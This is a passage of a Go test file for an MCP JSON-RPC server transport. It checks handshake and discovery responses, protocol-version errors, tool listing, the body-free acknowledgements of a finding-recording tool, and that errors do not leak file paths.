package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"compound/internal/contract"
	"compound/internal/envelope"
	"compound/internal/finding"
	"compound/internal/home"
)

const mcpTestModernProtocolVersion = "2026-07-28"

// runMCPTransport drives the MCP transport with the given input lines (raw
// JSON-RPC bytes, one envelope per line) and returns the captured stdout lines.
// It also wires ioIn/ioOut around a temp dir so the test never touches the
// real COMPOUND_HOME.
func runMCPTransport(t *testing.T, init func(homePath string), stdinLines []string, homePath string) []string {
	t.Helper()
	if init != nil {
		init(homePath)
	}
	in := bytes.NewBuffer(nil)
	for _, l := range stdinLines {
		in.WriteString(l)
		if !strings.HasSuffix(l, "\n") {
			in.WriteString("\n")
		}
	}
	priorIn, priorOut := ioIn, ioOut
	t.Cleanup(func() { ioIn, ioOut = priorIn, priorOut })
	ioIn = bytes.NewReader(in.Bytes())
	var outBuf bytes.Buffer
	ioOut = &outBuf
	if err := runMcpTransportLoop(); err != nil && !errors.Is(err, io.EOF) {
		t.Fatalf("transport loop: %v", err)
	}
	scanner := bufio.NewScanner(&outBuf)
	scanner.Buffer(make([]byte, 0, 1<<20), 1<<24)
	var lines []string
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		t.Fatalf("scan stdout: %v", err)
	}
	return lines
}

func runReadyMCPTransport(t *testing.T, init func(homePath string), stdinLines []string, homePath string) []string {
	t.Helper()
	handshake := []string{
		`{"jsonrpc":"2.0","id":"mcp-test-initialize","method":"initialize","params":{"protocolVersion":"` + mcpProtocolVersion + `","capabilities":{},"clientInfo":{"name":"compound-test","version":"1"}}}`,
		`{"jsonrpc":"2.0","method":"notifications/initialized"}`,
	}
	handshake = append(handshake, stdinLines...)
	return runMCPTransport(t, init, handshake, homePath)
}

func modernMeta(version string) map[string]any {
	return map[string]any{
		"io.modelcontextprotocol/protocolVersion":    version,
		"io.modelcontextprotocol/clientCapabilities": map[string]any{},
		"io.modelcontextprotocol/clientInfo": map[string]any{
			"name":    "compound-test",
			"version": "1",
		},
	}
}

func runModernMCPTransport(t *testing.T, init func(homePath string), stdinLines []string, homePath string) []string {
	t.Helper()
	return runMCPTransport(t, init, stdinLines, homePath)
}

func rawResp(t *testing.T, lines []string, id interface{}) map[string]interface{} {
	t.Helper()
	for _, line := range lines {
		var env map[string]interface{}
		if err := json.Unmarshal([]byte(line), &env); err != nil {
			t.Fatalf("parse response: %v\n%s", err, line)
		}
		if v, ok := env["id"]; ok && matchesID(v, id) {
			return env
		}
	}
	t.Fatalf("no response for id %v in %d lines", id, len(lines))
	return nil
}

func matchesID(a, b interface{}) bool {
	ab, _ := json.Marshal(a)
	bb, _ := json.Marshal(b)
	return bytes.Equal(ab, bb)
}

// initMCPTestHome creates a fresh COMPOUND_HOME for MCP transport tests.
func initMCPTestHome(t *testing.T) string {
	t.Helper()
	homePath := t.TempDir()
	t.Setenv("COMPOUND_HOME", homePath)
	if err := home.Init(homePath, "test", cliTestNow); err != nil {
		t.Fatalf("home.Init: %v", err)
	}
	return homePath
}

func assertMCPDiscoverResult(t *testing.T, env map[string]interface{}) {
	t.Helper()
	if env["error"] != nil {
		t.Fatalf("server/discover returned error: %+v", env["error"])
	}
	result, ok := env["result"].(map[string]interface{})
	if !ok {
		t.Fatalf("server/discover missing result: %+v", env)
	}
	if len(result) != 6 {
		t.Fatalf("server/discover result keys = %v, want exact six-field result", result)
	}
	if result["resultType"] != "complete" {
		t.Fatalf("resultType = %v, want complete", result["resultType"])
	}
	versions, ok := result["supportedVersions"].([]interface{})
	if !ok || len(versions) != 1 || versions[0] != mcpTestModernProtocolVersion {
		t.Fatalf("supportedVersions = %v, want [%q]", result["supportedVersions"], mcpTestModernProtocolVersion)
	}
	capabilities, ok := result["capabilities"].(map[string]interface{})
	if !ok || len(capabilities) != 1 {
		t.Fatalf("capabilities = %v, want tools-only object", result["capabilities"])
	}
	tools, ok := capabilities["tools"].(map[string]interface{})
	if !ok || len(tools) != 0 {
		t.Fatalf("capabilities.tools = %v, want empty object", capabilities["tools"])
	}
	if ttl, ok := result["ttlMs"].(float64); !ok || ttl != 3600000 {
		t.Fatalf("ttlMs = %v, want 3600000", result["ttlMs"])
	}
	if result["cacheScope"] != "public" {
		t.Fatalf("cacheScope = %v, want public", result["cacheScope"])
	}
	meta, ok := result["_meta"].(map[string]interface{})
	if !ok || len(meta) != 1 {
		t.Fatalf("_meta = %v, want serverInfo-only object", result["_meta"])
	}
	serverInfo, ok := meta["io.modelcontextprotocol/serverInfo"].(map[string]interface{})
	if !ok || len(serverInfo) != 2 {
		t.Fatalf("serverInfo = %v, want exact name/version object", meta["io.modelcontextprotocol/serverInfo"])
	}
	if serverInfo["name"] != mcpServerName || serverInfo["version"] != mcpServerVersion {
		t.Fatalf("serverInfo = %v, want %s@%s", serverInfo, mcpServerName, mcpServerVersion)
	}
}

// ---------- Protocol-level tests (no tool) ----------

func TestMCPTransportInitializeReturnsServerInfoAndCapabilities(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"probe","version":"0"}}}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	if len(lines) != 1 {
		t.Fatalf("initialize produced %d response lines, want 1", len(lines))
	}
	var env map[string]interface{}
	if err := json.Unmarshal([]byte(lines[0]), &env); err != nil {
		t.Fatalf("parse response: %v", err)
	}
	if env["jsonrpc"] != "2.0" {
		t.Fatalf("jsonrpc = %v, want 2.0", env["jsonrpc"])
	}
	if env["id"] != float64(1) {
		t.Fatalf("id = %v, want 1", env["id"])
	}
	res, ok := env["result"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing result: %+v", env)
	}
	if res["protocolVersion"] != mcpLegacyProtocolVersion {
		t.Fatalf("protocolVersion = %v, want %q", res["protocolVersion"], mcpLegacyProtocolVersion)
	}
	srv, ok := res["serverInfo"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing serverInfo")
	}
	if srv["name"] != mcpServerName || srv["version"] != mcpServerVersion {
		t.Fatalf("serverInfo = %+v", srv)
	}
	caps, ok := res["capabilities"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing capabilities")
	}
	if _, ok := caps["tools"]; !ok {
		t.Fatalf("capabilities missing tools: %+v", caps)
	}
	if _, ok := caps["resources"]; ok {
		t.Fatalf("transport must not advertise resources: %+v", caps)
	}
	if _, ok := caps["prompts"]; ok {
		t.Fatalf("transport must not advertise prompts: %+v", caps)
	}
}

func TestMCPTransportDiscover_AnswersPreInitializeWithFullResult(t *testing.T) {
	homePath := initMCPTestHome(t)
	request := map[string]any{
		"jsonrpc": "2.0",
		"id":      "discover-modern",
		"method":  "server/discover",
		"params":  map[string]any{"_meta": modernMeta(mcpTestModernProtocolVersion)},
	}
	lines := runModernMCPTransport(t, nil, []string{string(mustJSON(t, request))}, homePath)
	assertMCPDiscoverResult(t, rawResp(t, lines, "discover-modern"))
}

func TestMCPTransportDiscover_ToleratesAbsentParams(t *testing.T) {
	homePath := initMCPTestHome(t)
	lines := runModernMCPTransport(t, nil, []string{
		`{"jsonrpc":"2.0","id":"discover-no-params","method":"server/discover"}`,
	}, homePath)
	assertMCPDiscoverResult(t, rawResp(t, lines, "discover-no-params"))
}

func TestMCPTransportDiscover_WorksAfterLegacyHandshake(t *testing.T) {
	homePath := initMCPTestHome(t)
	lines := runReadyMCPTransport(t, nil, []string{
		`{"jsonrpc":"2.0","id":"discover-ready","method":"server/discover"}`,
	}, homePath)
	assertMCPDiscoverResult(t, rawResp(t, lines, "discover-ready"))
}

func TestMCPTransportInitializeRejectsNonTwenty(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"1.0","id":1,"method":"initialize"}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	env := rawResp(t, lines, 1)
	errObj, ok := env["error"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing error: %+v", env)
	}
	if errObj["code"] != float64(rpcInvalidRequest) {
		t.Fatalf("code = %v, want %d", errObj["code"], rpcInvalidRequest)
	}
}

func TestMCPTransportMissingMethodReturnsInvalidRequest(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","id":2}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	env := rawResp(t, lines, 2)
	errObj := env["error"].(map[string]interface{})
	if errObj["code"] != float64(rpcInvalidRequest) {
		t.Fatalf("code = %v, want %d", errObj["code"], rpcInvalidRequest)
	}
}

func TestMCPTransportParseErrorReturns32700(t *testing.T) {
	homePath := initMCPTestHome(t)
	bad := "{this is not valid json" + "\n"
	lines := runMCPTransport(t, nil, []string{bad}, homePath)
	if len(lines) != 1 {
		t.Fatalf("expected one parse-error response, got %d: %v", len(lines), lines)
	}
	var env map[string]interface{}
	if err := json.Unmarshal([]byte(lines[0]), &env); err != nil {
		t.Fatalf("parse: %v", err)
	}
	errObj := env["error"].(map[string]interface{})
	if errObj["code"] != float64(rpcParseError) {
		t.Fatalf("code = %v, want %d", errObj["code"], rpcParseError)
	}
}

func TestMCPTransportUnknownMethodReturnsMethodNotFound(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","id":99,"method":"bogus/method"}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	env := rawResp(t, lines, 99)
	errObj := env["error"].(map[string]interface{})
	if errObj["code"] != float64(rpcMethodNotFound) {
		t.Fatalf("code = %v, want %d", errObj["code"], rpcMethodNotFound)
	}
}

func TestMCPTransportNotificationProducesNoResponse(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","method":"notifications/initialized"}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	if len(lines) != 0 {
		t.Fatalf("notification produced %d response lines; want 0", len(lines))
	}
}

func TestMCPTransportPingReturnsEmptyResult(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","id":3,"method":"ping"}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	env := rawResp(t, lines, 3)
	if env["error"] != nil {
		t.Fatalf("ping returned error: %+v", env["error"])
	}
	res, ok := env["result"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing result: %+v", env)
	}
	if len(res) != 0 {
		t.Fatalf("ping result not empty: %+v", res)
	}
}

// ---------- tools/list ----------

func TestMCPTransportToolsListReturnsExactlyTwoTools(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","id":7,"method":"tools/list"}` + "\n"
	lines := runReadyMCPTransport(t, nil, []string{req}, homePath)
	env := rawResp(t, lines, 7)
	res := env["result"].(map[string]interface{})
	tools, ok := res["tools"].([]interface{})
	if !ok {
		t.Fatalf("missing tools array: %+v", res)
	}
	if len(tools) != 2 {
		t.Fatalf("tools/list returned %d tools, want exactly 2", len(tools))
	}
	names := map[string]bool{}
	for _, raw := range tools {
		t1 := raw.(map[string]interface{})
		name, _ := t1["name"].(string)
		names[name] = true
		if _, ok := t1["inputSchema"].(map[string]interface{}); !ok {
			t.Fatalf("tool %q missing typed inputSchema: %+v", name, t1)
		}
		if desc, _ := t1["description"].(string); desc == "" {
			t.Fatalf("tool %q missing description", name)
		}
	}
	if !names[mcpFindingToolName] {
		t.Fatalf("missing tool %q in %v", mcpFindingToolName, names)
	}
	if !names[mcpOrientToolName] {
		t.Fatalf("missing tool %q in %v", mcpOrientToolName, names)
	}
}

func TestMCPTransportModern_ToolsListStatelessWithCachingHints(t *testing.T) {
	homePath := initMCPTestHome(t)
	request := map[string]any{
		"jsonrpc": "2.0",
		"id":      "modern-list",
		"method":  "tools/list",
		"params":  map[string]any{"_meta": modernMeta(mcpTestModernProtocolVersion)},
	}
	env := rawResp(t, runModernMCPTransport(t, nil, []string{string(mustJSON(t, request))}, homePath), "modern-list")
	if env["error"] != nil {
		t.Fatalf("modern tools/list returned error: %+v", env["error"])
	}
	result, ok := env["result"].(map[string]interface{})
	if !ok || len(result) != 5 {
		t.Fatalf("modern tools/list result = %v, want exact five-field result", env["result"])
	}
	if result["resultType"] != "complete" {
		t.Fatalf("resultType = %v, want complete", result["resultType"])
	}
	tools, ok := result["tools"].([]interface{})
	if !ok || len(tools) != 2 {
		t.Fatalf("tools = %v, want exactly two descriptors", result["tools"])
	}
	if got := tools[0].(map[string]interface{})["name"]; got != mcpFindingToolName {
		t.Fatalf("first tool = %v, want %q", got, mcpFindingToolName)
	}
	if got := tools[1].(map[string]interface{})["name"]; got != mcpOrientToolName {
		t.Fatalf("second tool = %v, want %q", got, mcpOrientToolName)
	}
	if result["ttlMs"] != float64(3600000) || result["cacheScope"] != "public" {
		t.Fatalf("caching hints = ttlMs:%v cacheScope:%v", result["ttlMs"], result["cacheScope"])
	}
	assertMCPModernServerInfo(t, result)
}

func TestMCPTransportModern_UnsupportedVersionReturns32022(t *testing.T) {
	for index, version := range []string{"2025-06-18", "1900-01-01"} {
		t.Run(version, func(t *testing.T) {
			homePath := initMCPTestHome(t)
			request := map[string]any{
				"jsonrpc": "2.0",
				"id":      index + 1,
				"method":  "tools/list",
				"params":  map[string]any{"_meta": modernMeta(version)},
			}
			errObject := rawResp(t, runModernMCPTransport(t, nil, []string{string(mustJSON(t, request))}, homePath), index+1)["error"].(map[string]interface{})
			if errObject["code"] != float64(-32022) {
				t.Fatalf("code = %v, want -32022", errObject["code"])
			}
			if errObject["message"] != "Unsupported protocol version" {
				t.Fatalf("message = %v, want bounded protocol error", errObject["message"])
			}
			data, ok := errObject["data"].(map[string]interface{})
			if !ok || len(data) != 2 {
				t.Fatalf("data = %v, want supported/requested only", errObject["data"])
			}
			supported, ok := data["supported"].([]interface{})
			if !ok || len(supported) != 1 || supported[0] != mcpTestModernProtocolVersion {
				t.Fatalf("supported = %v, want [%q]", data["supported"], mcpTestModernProtocolVersion)
			}
			if data["requested"] != version {
				t.Fatalf("requested = %v, want %q", data["requested"], version)
			}
		})
	}
}

func TestMCPTransportModern_MissingClientCapabilitiesReturns32602(t *testing.T) {
	validVersion := map[string]any{
		"io.modelcontextprotocol/protocolVersion": mcpTestModernProtocolVersion,
	}
	tooLongName := strings.Repeat("n", mcpMaxClientNameChars+1)
	tooLongVersion := strings.Repeat("v", mcpMaxClientVersionChars+1)
	tests := []struct {
		name string
		meta any
	}{
		{name: "missing capabilities", meta: validVersion},
		{name: "meta not object", meta: []any{mcpTestModernProtocolVersion}},
		{name: "protocol version not string", meta: map[string]any{
			"io.modelcontextprotocol/protocolVersion":    20260728,
			"io.modelcontextprotocol/clientCapabilities": map[string]any{},
		}},
		{name: "capabilities not object", meta: map[string]any{
			"io.modelcontextprotocol/protocolVersion":    mcpTestModernProtocolVersion,
			"io.modelcontextprotocol/clientCapabilities": []any{},
		}},
		{name: "client info not object", meta: map[string]any{
			"io.modelcontextprotocol/protocolVersion":    mcpTestModernProtocolVersion,
			"io.modelcontextprotocol/clientCapabilities": map[string]any{},
			"io.modelcontextprotocol/clientInfo":         "invalid",
		}},
		{name: "client name over cap", meta: map[string]any{
			"io.modelcontextprotocol/protocolVersion":    mcpTestModernProtocolVersion,
			"io.modelcontextprotocol/clientCapabilities": map[string]any{},
			"io.modelcontextprotocol/clientInfo":         map[string]any{"name": tooLongName},
		}},
		{name: "client version over cap", meta: map[string]any{
			"io.modelcontextprotocol/protocolVersion":    mcpTestModernProtocolVersion,
			"io.modelcontextprotocol/clientCapabilities": map[string]any{},
			"io.modelcontextprotocol/clientInfo":         map[string]any{"version": tooLongVersion},
		}},
	}
	for index, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			homePath := initMCPTestHome(t)
			request := map[string]any{
				"jsonrpc": "2.0",
				"id":      index + 1,
				"method":  "tools/list",
				"params":  map[string]any{"_meta": test.meta},
			}
			errObject := rawResp(t, runModernMCPTransport(t, nil, []string{string(mustJSON(t, request))}, homePath), index+1)["error"].(map[string]interface{})
			if errObject["code"] != float64(rpcInvalidParams) {
				t.Fatalf("code = %v, want %d", errObject["code"], rpcInvalidParams)
			}
		})
	}
}

func TestMCPTransportModern_ErrorsNeverLeakPathsOrInternalText(t *testing.T) {
	homePath := initMCPTestHome(t)
	sentinel := homePath + ": synthetic modern raw body sentinel"
	unsupportedMeta := modernMeta("2025-06-18")
	unsupportedMeta["undocumented"] = sentinel
	requests := []string{
		string(mustJSON(t, map[string]any{
			"jsonrpc": "2.0",
			"id":      "unsupported",
			"method":  "tools/list",
			"params":  map[string]any{"_meta": unsupportedMeta, "rawBody": sentinel},
		})),
		string(mustJSON(t, map[string]any{
			"jsonrpc": "2.0",
			"id":      "invalid",
			"method":  "tools/list",
			"params": map[string]any{"_meta": map[string]any{
				"io.modelcontextprotocol/protocolVersion": mcpTestModernProtocolVersion,
				"io.modelcontextprotocol/clientInfo":      map[string]any{"note": sentinel},
			}},
		})),
	}
	lines := runModernMCPTransport(t, nil, requests, homePath)
	wire := strings.Join(lines, "\n")
	if strings.Contains(wire, homePath) || strings.Contains(wire, "synthetic modern raw body sentinel") {
		t.Fatalf("modern errors leaked request or path bytes: %s", wire)
	}
	unsupportedError := rawResp(t, lines, "unsupported")["error"].(map[string]interface{})
	data, ok := unsupportedError["data"].(map[string]interface{})
	if !ok || len(data) != 2 {
		t.Fatalf("unsupported-version data = %v, want exactly supported/requested", unsupportedError["data"])
	}
	if _, ok := data["supported"]; !ok {
		t.Fatalf("unsupported-version data missing supported: %v", data)
	}
	if _, ok := data["requested"]; !ok {
		t.Fatalf("unsupported-version data missing requested: %v", data)
	}
}

func TestMCPTransportModern_OversizedDeclaredVersionEchoBounded(t *testing.T) {
	homePath := initMCPTestHome(t)
	version := strings.Repeat("v", 300)
	request := map[string]any{
		"jsonrpc": "2.0",
		"id":      "oversized-version",
		"method":  "tools/list",
		"params":  map[string]any{"_meta": modernMeta(version)},
	}
	errObject := rawResp(t, runModernMCPTransport(t, nil, []string{string(mustJSON(t, request))}, homePath), "oversized-version")["error"].(map[string]interface{})
	if errObject["code"] != float64(-32022) {
		t.Fatalf("code = %v, want -32022", errObject["code"])
	}
	data, ok := errObject["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing error data: %+v", errObject)
	}
	requested, ok := data["requested"].(string)
	if !ok || len(requested) > 64 {
		t.Fatalf("requested echo length = %d, want <= 64", len(requested))
	}
}

func assertMCPModernServerInfo(t *testing.T, result map[string]interface{}) {
	t.Helper()
	meta, ok := result["_meta"].(map[string]interface{})
	if !ok || len(meta) != 1 {
		t.Fatalf("_meta = %v, want serverInfo-only object", result["_meta"])
	}
	serverInfo, ok := meta["io.modelcontextprotocol/serverInfo"].(map[string]interface{})
	if !ok || len(serverInfo) != 2 {
		t.Fatalf("serverInfo = %v, want exact name/version", meta["io.modelcontextprotocol/serverInfo"])
	}
	if serverInfo["name"] != mcpServerName || serverInfo["version"] != mcpServerVersion {
		t.Fatalf("serverInfo = %v, want %s@%s", serverInfo, mcpServerName, mcpServerVersion)
	}
}

// ---------- tools/call · finding_record ----------

func TestMCPTransportFindingRecordWritesToObservedFindingsAndReturnsBodyFreeAck(t *testing.T) {
	homePath := initMCPTestHome(t)
	beforeLedger := ledgerByteCount(t, homePath)
	args := map[string]any{
		"topic":         "mcp-test-write",
		"body":          "an MCP-transport-recorded body\nline two of body",
		"work_id":       "work_mcp_finding_record_test",
		"produced_by":   "mcp-transport-test",
		"evidence_refs": []string{"sha256:abc123", "git:1234567"},
	}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0",
		"id":      100,
		"method":  "tools/call",
		"params": map[string]any{
			"name":      mcpFindingToolName,
			"arguments": json.RawMessage(argsBytes),
		},
	}
	callBytes, _ := json.Marshal(call)
	lines := runReadyMCPTransport(t, nil, []string{string(callBytes) + "\n"}, homePath)
	env := rawResp(t, lines, 100)
	if env["error"] != nil {
		t.Fatalf("tool returned JSON-RPC error: %+v", env["error"])
	}
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); isErr {
		t.Fatalf("tool returned isError=true: %+v", res)
	}
	ack := decodeMCPStructuredContent(t, res)
	id, _ := ack["id"].(string)
	if !strings.HasPrefix(id, "find_") {
		t.Fatalf("ack id missing find_ prefix: %+v", ack)
	}
	if !strings.HasPrefix(id, "find_") || len(id) != len("find_")+12 {
		t.Fatalf("ack id = %q, want deterministic find_<12-hex> from topic|body", id)
	}
	if got, _ := ack["status"].(string); got != finding.StatusRecorded {
		t.Fatalf("status = %q, want %q", got, finding.StatusRecorded)
	}
	if got, _ := ack["path"].(string); got != filepath.ToSlash(filepath.Join(finding.Subdir, id+".json")) {
		t.Fatalf("path = %q, want deterministic observed/findings path", got)
	}
	if got, _ := ack["privacy"].(string); got != finding.PrivacyPrivate {
		t.Fatalf("privacy = %q, want %q", got, finding.PrivacyPrivate)
	}
	// Ack must NOT carry the body or its cid — body-free ack contract.
	if _, ok := ack["body"]; ok {
		t.Fatalf("ack leaked body field: %+v", ack)
	}
	if _, ok := ack["cid"]; ok {
		t.Fatalf("ack leaked cid field: %+v", ack)
	}
	recPath := filepath.Join(homePath, finding.Subdir, id+".json")
	if _, err := os.Stat(recPath); err != nil {
		t.Fatalf("finding missing on disk: %v", err)
	}
	// Never-ledger invariant: a successful record MUST add ZERO ledger bytes.
	afterLedger := ledgerByteCount(t, homePath)
	if afterLedger != beforeLedger {
		t.Fatalf("finding record added %d ledger bytes (before=%d after=%d) — never-ledger invariant broken", afterLedger-beforeLedger, beforeLedger, afterLedger)
	}
}

func TestMCPTransportModern_ToolsCallFindingRecordWritesAndAcks(t *testing.T) {
	homePath := initMCPTestHome(t)
	beforeLedger := ledgerByteCount(t, homePath)
	args := map[string]any{
		"topic":         "modern-mcp-test-write",
		"body":          "a modern MCP transport body\nline two",
		"work_id":       "work_modern_mcp_finding_record_test",
		"produced_by":   "mcp-transport-test",
		"evidence_refs": []string{"sha256:def456", "git:7654321"},
	}
	request := map[string]any{
		"jsonrpc": "2.0",
		"id":      "modern-finding",
		"method":  "tools/call",
		"params": map[string]any{
			"name":      mcpFindingToolName,
			"arguments": args,
			"_meta":     modernMeta(mcpTestModernProtocolVersion),
		},
	}
	env := rawResp(t, runModernMCPTransport(t, nil, []string{string(mustJSON(t, request))}, homePath), "modern-finding")
	if env["error"] != nil {
		t.Fatalf("modern finding call returned JSON-RPC error: %+v", env["error"])
	}
	result, ok := env["result"].(map[string]interface{})
	if !ok || len(result) != 4 {
		t.Fatalf("modern tools/call result = %v, want exact four-field result", env["result"])
	}
	if result["resultType"] != "complete" || result["isError"] != false {
		t.Fatalf("modern result markers = resultType:%v isError:%v", result["resultType"], result["isError"])
	}
	if _, ok := result["ttlMs"]; ok {
		t.Fatalf("tools/call must not be cacheable: %+v", result)
	}
	if _, ok := result["cacheScope"]; ok {
		t.Fatalf("tools/call must not carry cacheScope: %+v", result)
	}
	assertMCPModernServerInfo(t, result)
	ack := decodeMCPStructuredContent(t, result)
	id, _ := ack["id"].(string)
	if !strings.HasPrefix(id, "find_") || len(id) != len("find_")+12 {
		t.Fatalf("ack id = %q, want deterministic find_<12-hex>", id)
	}
	if ack["schema"] != mcpFindingAckSchema ||
		ack["status"] != finding.StatusRecorded ||
		ack["path"] != filepath.ToSlash(filepath.Join(finding.Subdir, id+".json")) ||
		ack["privacy"] != finding.PrivacyPrivate ||
		ack["visibility"] != finding.VisibilityOperational {
		t.Fatalf("modern ack diverged from legacy ack contract: %+v", ack)
	}
	if len(ack) != 6 {
		t.Fatalf("modern ack fields = %v, want body-free six-field ack", ack)
	}
	if _, err := os.Stat(filepath.Join(homePath, finding.Subdir, id+".json")); err != nil {
		t.Fatalf("finding missing on disk: %v", err)
	}
	if afterLedger := ledgerByteCount(t, homePath); afterLedger != beforeLedger {
		t.Fatalf("modern finding added %d ledger bytes", afterLedger-beforeLedger)
	}
}

func ledgerByteCount(t *testing.T, homePath string) int64 {
	t.Helper()
	var total int64
	ledgerDir := filepath.Join(homePath, "ledger")
	err := filepath.WalkDir(ledgerDir, func(p string, d os.DirEntry, err error) error {
		if err != nil {
			if errors.Is(err, os.ErrNotExist) {
				return nil
			}
			return err
		}
		if d.IsDir() {
			return nil
		}
		info, infoErr := d.Info()
		if infoErr != nil {
			return infoErr
		}
		total += info.Size()
		return nil
	})
	if err != nil {
		t.Fatalf("walk ledger: %v", err)
	}
	return total
}

func TestMCPTransportFindingRecordDuplicateReturnsStatusDuplicate(t *testing.T) {
	homePath := initMCPTestHome(t)
	args := map[string]any{"topic": "mcp-dup", "body": "duplicate-body"}
	argsBytes, _ := json.Marshal(args)
	first := map[string]any{
		"jsonrpc": "2.0", "id": 200, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	second := map[string]any{
		"jsonrpc": "2.0", "id": 201, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, first)) + "\n", string(mustJSON(t, second)) + "\n"}, homePath)
	resFirst := rawResp(t, lines, 200)["result"].(map[string]interface{})
	resSecond := rawResp(t, lines, 201)["result"].(map[string]interface{})
	ack1 := decodeMCPStructuredContent(t, resFirst)
	ack2 := decodeMCPStructuredContent(t, resSecond)
	if ack1["status"] != finding.StatusRecorded {
		t.Fatalf("first call status = %v, want %q", ack1["status"], finding.StatusRecorded)
	}
	if ack2["status"] != finding.StatusDuplicate {
		t.Fatalf("duplicate status = %v, want %q — body-free ack must stay identical", ack2["status"], finding.StatusDuplicate)
	}
	if ack1["id"] != ack2["id"] {
		t.Fatalf("duplicate id mismatch: first=%v second=%v", ack1["id"], ack2["id"])
	}
}

func TestMCPTransportFindingRecordRejectsMissingTopic(t *testing.T) {
	homePath := initMCPTestHome(t)
	args := map[string]any{"body": "x"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 300, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 300)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("expected isError=true, got %+v", res)
	}
}

func TestMCPTransportFindingRecordRejectsMissingBody(t *testing.T) {
	homePath := initMCPTestHome(t)
	args := map[string]any{"topic": "x"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 301, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 301)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("expected isError=true, got %+v", res)
	}
}

func TestMCPTransportFindingRecordRejectsUnknownArgumentField(t *testing.T) {
	homePath := initMCPTestHome(t)
	args := map[string]any{"topic": "x", "body": "y", "rogue_field": "z"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 302, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 302)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("unknown arg field must be rejected, got %+v", res)
	}
}

func TestMCPTransportFindingRecordRejectsBodyExceedingMax(t *testing.T) {
	homePath := initMCPTestHome(t)
	huge := strings.Repeat("z", mcpMaxFindingBodyBytes+1)
	args := map[string]any{"topic": "huge", "body": huge}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 303, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runReadyMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 303)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("oversized body must be rejected, got %+v", res)
	}
}

// ---------- tools/call · orient_recall ----------

// stubOrientMaterializer is a deterministic replacement for
// materializeOrientContextPack so tests can assert ack shape without depending
// on the live orient stack (no installed-harness binding, no policy load).

func TestMCPTransportOrientRecallPersistsSealedArtifactsAndReturnsBoundedAck(t *testing.T) {
	homePath := initMCPTestHome(t)
	priorRuntime, priorBodies := materializeRuntimeForOrient, materializeBodiesForOrient
	t.Cleanup(func() { materializeRuntimeForOrient, materializeBodiesForOrient = priorRuntime, priorBodies })

	materializeRuntimeForOrient = func(in contract.Input, pol contract.OrientationPolicy, _ string, now time.Time) (contract.RuntimeMaterialization, error) {
		ec := contract.Compile(in, pol, now)
		pack := contract.Pack(in, pol, now)
		pack.ActiveDecisions = []string{"decision_alpha", "decision_beta"}
		pack.ActiveMemory = []string{"memory_one", "memory_two"}
		pack.SummaryMD = "stub pack for mcp transport test"
		return contract.RuntimeMaterialization{EffectiveContract: ec, ContextPack: pack}, nil
	}
	materializeBodiesForOrient = func(string, envelope.ContextPack, string, string, int) (envelope.ContextPack, error) {
		// keep pack body-free: bounded task recall proves ID/recall refs only
		return envelope.ContextPack{}, nil
	}

	args := map[string]any{
